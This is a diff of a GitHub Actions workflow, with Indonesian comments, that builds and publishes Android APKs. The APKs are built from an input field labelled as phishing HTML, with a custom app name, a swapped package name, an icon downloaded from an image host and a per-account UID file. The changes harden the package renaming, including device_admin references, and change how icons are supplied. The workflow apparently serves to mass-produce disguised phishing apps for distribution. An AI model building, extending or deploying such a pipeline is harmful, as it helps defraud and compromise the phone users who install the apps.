@@ -10,14 +10,10 @@ on:
       html_content:
         description: 'Isi HTML phishing'
         required: true
-      icon_base64:
-        description: 'Icon base64 (tanpa prefix data:image/...)'
+      icon_url:
+        description: 'URL icon (dari catbox/imgbb)'
         required: false
         default: ''
-      icon_ext:
-        description: 'Ekstensi icon (png/jpg/webp)'
-        required: false
-        default: 'png'
       uid:
         description: 'UID akun'
         required: true
@@ -52,7 +48,6 @@ jobs:
         shell: bash
         run: |
           APP_NAME="${{ github.event.inputs.app_name }}"
-          # escape untuk XML
           APP_NAME_ESC=$(echo "$APP_NAME" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
           STRINGS_FILE="app/src/main/res/values/strings.xml"
           mkdir -p "$(dirname "$STRINGS_FILE")"
@@ -62,78 +57,132 @@ jobs:
               <string name="app_name">${APP_NAME_ESC}</string>
           </resources>
           EOF
-          echo "App label set to: $APP_NAME"
+          echo "✅ App label set to: $APP_NAME"
 
-      # ─── Override package name ───
+      # ─── Override package name (ROBUST) ───
       - name: Override package name
         shell: bash
         run: |
+          set -e
           NEW_PKG="${{ github.event.inputs.package_name }}"
           if [ -z "$NEW_PKG" ]; then NEW_PKG="com.sync.xxx"; fi
-          OLD_PKG=$(grep -oP 'namespace\s*=\s*"\K[^"]+' app/build.gradle.kts 2>/dev/null | head -1 || echo "")
-          if [ -z "$OLD_PKG" ]; then
-            OLD_PKG=$(grep -oP 'namespace\s*=\s*"\K[^"]+' app/build.gradle 2>/dev/null | head -1 || echo "com.sync.xxx")
+
+          # Deteksi OLD package dari gradle
+          OLD_PKG=""
+          if [ -f app/build.gradle.kts ]; then
+            OLD_PKG=$(grep -oP 'namespace\s*=\s*"\K[^"]+' app/build.gradle.kts | head -1 || true)
+            if [ -z "$OLD_PKG" ]; then
+              OLD_PKG=$(grep -oP 'applicationId\s*=\s*"\K[^"]+' app/build.gradle.kts | head -1 || true)
+            fi
           fi
+          if [ -z "$OLD_PKG" ] && [ -f app/build.gradle ]; then
+            OLD_PKG=$(grep -oP 'namespace\s+"\K[^"]+' app/build.gradle | head -1 || true)
+            if [ -z "$OLD_PKG" ]; then
+              OLD_PKG=$(grep -oP 'applicationId\s+"\K[^"]+' app/build.gradle | head -1 || true)
+            fi
+          fi
+
+          if [ -z "$OLD_PKG" ]; then
+            echo "⚠️ Tidak bisa deteksi OLD package, pakai default com.sync.xxx"
+            OLD_PKG="com.sync.xxx"
+          fi
+
           echo "Old package: $OLD_PKG → New package: $NEW_PKG"
 
-          if [ "$OLD_PKG" != "$NEW_PKG" ]; then
-            # 1. Update namespace & applicationId di build.gradle(.kts)
-            if [ -f app/build.gradle.kts ]; then
-              sed -i "s/namespace = \"$OLD_PKG\"/namespace = \"$NEW_PKG\"/g" app/build.gradle.kts
-              sed -i "s/applicationId = \"$OLD_PKG\"/applicationId = \"$NEW_PKG\"/g" app/build.gradle.kts
-            fi
-            if [ -f app/build.gradle ]; then
-              sed -i "s/namespace \"$OLD_PKG\"/namespace \"$NEW_PKG\"/g" app/build.gradle
-              sed -i "s/applicationId \"$OLD_PKG\"/applicationId \"$NEW_PKG\"/g" app/build.gradle
-            fi
-
-            # 2. Move folder source code
-            OLD_PATH="app/src/main/java/$(echo $OLD_PKG | tr '.' '/')"
-            NEW_PATH="app/src/main/java/$(echo $NEW_PKG | tr '.' '/')"
-            if [ -d "$OLD_PATH" ]; then
-              mkdir -p "$(dirname "$NEW_PATH")"
-              mv "$OLD_PATH" "$NEW_PATH"
-            fi
-
-            # 3. Ganti semua import & package di file .kt / .java
-            find app/src -type f \( -name "*.kt" -o -name "*.java" \) -exec \
-              sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" {} +
-
-            # 4. Ganti package di AndroidManifest
-            if [ -f app/src/main/AndroidManifest.xml ]; then
-              sed -i "s/package=\"$OLD_PKG\"/package=\"$NEW_PKG\"/g" app/src/main/AndroidManifest.xml
-            fi
-          fi
-
-      # ─── Set icon (dari base64) ───
-      - name: Set icon from base64
-        shell: bash
-        run: |
-          ICON_B64="${{ github.event.inputs.icon_base64 }}"
-          ICON_EXT="${{ github.event.inputs.icon_ext }}"
-          if [ -z "$ICON_EXT" ]; then ICON_EXT="png"; fi
-
-          if [ -z "$ICON_B64" ]; then
-            echo "No icon provided, using default."
+          if [ "$OLD_PKG" = "$NEW_PKG" ]; then
+            echo "✅ Package sudah sama, skip replace"
             exit 0
           fi
 
-          echo "$ICON_B64" | base64 -d > /tmp/custom_icon.$ICON_EXT
-
-          # Konversi ke PNG kalau bukan PNG
-          if [ "$ICON_EXT" != "png" ]; then
-            sudo apt-get update -qq
-            sudo apt-get install -y -qq imagemagick
-            convert /tmp/custom_icon.$ICON_EXT /tmp/custom_icon.png
-          else
-            cp /tmp/custom_icon.$ICON_EXT /tmp/custom_icon.png
+          # 1. Update build.gradle(.kts)
+          if [ -f app/build.gradle.kts ]; then
+            sed -i "s/namespace = \"$OLD_PKG\"/namespace = \"$NEW_PKG\"/g" app/build.gradle.kts
+            sed -i "s/applicationId = \"$OLD_PKG\"/applicationId = \"$NEW_PKG\"/g" app/build.gradle.kts
+            echo "✅ build.gradle.kts updated"
+          fi
+          if [ -f app/build.gradle ]; then
+            sed -i "s/namespace \"$OLD_PKG\"/namespace \"$NEW_PKG\"/g" app/build.gradle
+            sed -i "s/applicationId \"$OLD_PKG\"/applicationId \"$NEW_PKG\"/g" app/build.gradle
+            echo "✅ build.gradle updated"
           fi
 
-          # Copy ke semua density mipmap
+          # 2. Move folder source code
+          OLD_PATH="app/src/main/java/$(echo $OLD_PKG | tr '.' '/')"
+          NEW_PATH="app/src/main/java/$(echo $NEW_PKG | tr '.' '/')"
+          if [ -d "$OLD_PATH" ]; then
+            mkdir -p "$(dirname "$NEW_PATH")"
+            mv "$OLD_PATH" "$NEW_PATH"
+            echo "✅ Source folder moved: $OLD_PATH → $NEW_PATH"
+          else
+            echo "⚠️ Folder source tidak ditemukan di $OLD_PATH"
+          fi
+
+          # 3. Ganti package di semua .kt / .java
+          find app/src -type f \( -name "*.kt" -o -name "*.java" \) -exec \
+            sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" {} +
+
+          # 4. Manifest — handle BOTH kasus (ada package="" atau tidak)
+          MANIFEST="app/src/main/AndroidManifest.xml"
+          if [ -f "$MANIFEST" ]; then
+            if grep -q 'package="' "$MANIFEST"; then
+              sed -i "s/package=\"$OLD_PKG\"/package=\"$NEW_PKG\"/g" "$MANIFEST"
+              echo "✅ Manifest package attribute updated"
+            else
+              echo "ℹ️ Manifest tidak punya package attribute (normal di AGP modern)"
+            fi
+
+            # Also replace any remaining reference to old pkg in manifest
+            sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" "$MANIFEST"
+          fi
+
+          # 5. Ganti juga di res/ (kalau ada reference package di XML, misal device_admin)
+          find app/src/main/res -type f -name "*.xml" -exec \
+            sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" {} + 2>/dev/null || true
+
+          # 6. Verify
+          echo "🔍 Verifying package replacement..."
+          if [ -f app/build.gradle.kts ]; then
+            grep -E "namespace|applicationId" app/build.gradle.kts | grep "$NEW_PKG" && echo "✅ namespace/applicationId verified" || echo "❌ MISMATCH in gradle.kts!"
+          fi
+          if [ -f app/build.gradle ]; then
+            grep -E "namespace|applicationId" app/build.gradle | grep "$NEW_PKG" && echo "✅ namespace/applicationId verified" || echo "❌ MISMATCH in gradle!"
+          fi
+          if [ -d "$NEW_PATH" ]; then
+            echo "✅ New source folder exists: $NEW_PATH"
+          else
+            echo "⚠️ New source folder tidak ada, tapi mungkin project pakai struktur lain"
+          fi
+
+      # ─── Set icon from URL ───
+      - name: Set icon from URL
+        shell: bash
+        run: |
+          ICON_URL="${{ github.event.inputs.icon_url }}"
+          if [ -z "$ICON_URL" ]; then
+            echo "ℹ️ No icon provided, using default."
+            exit 0
+          fi
+
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq imagemagick wget
+
+          echo "⬇️ Downloading icon from: $ICON_URL"
+          wget -q -O /tmp/custom_icon_raw "$ICON_URL" || curl -sL "$ICON_URL" -o /tmp/custom_icon_raw
+
+          if [ ! -s /tmp/custom_icon_raw ]; then
+            echo "❌ Gagal download icon dari URL"
+            exit 1
+          fi
+
+          echo "🖼️ Converting to PNG..."
+          convert /tmp/custom_icon_raw /tmp/custom_icon.png || {
+            echo "❌ Gagal convert icon, mungkin bukan gambar valid"
+            exit 1
+          }
+
           for d in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
             DIR="app/src/main/res/mipmap-$d"
             mkdir -p "$DIR"
-            SIZES_MD=(48 72 96 144 192)
             case $d in
               mdpi)    SZ=48  ;;
               hdpi)    SZ=72  ;;
@@ -164,7 +213,7 @@ jobs:
           echo "{\"uid\":\"${{ github.event.inputs.uid }}\"}" > app/src/main/assets/uid.json
           echo "✅ uid.json written: ${{ github.event.inputs.uid }}"
 
-      # ─── Setup signing (opsional) ───
+      # ─── Setup signing ───
       - name: Setup debug keystore
         shell: bash
         run: |
@@ -210,7 +259,6 @@ jobs:
             **Package:** ${{ github.event.inputs.package_name }}
             **UID:** ${{ github.event.inputs.uid }}
             **Run:** #${{ github.run_number }}
-            **Date:** ${{ github.event.repository.updated_at }}
           files: SyncXxX.apk
           draft: false
           prerelease: false
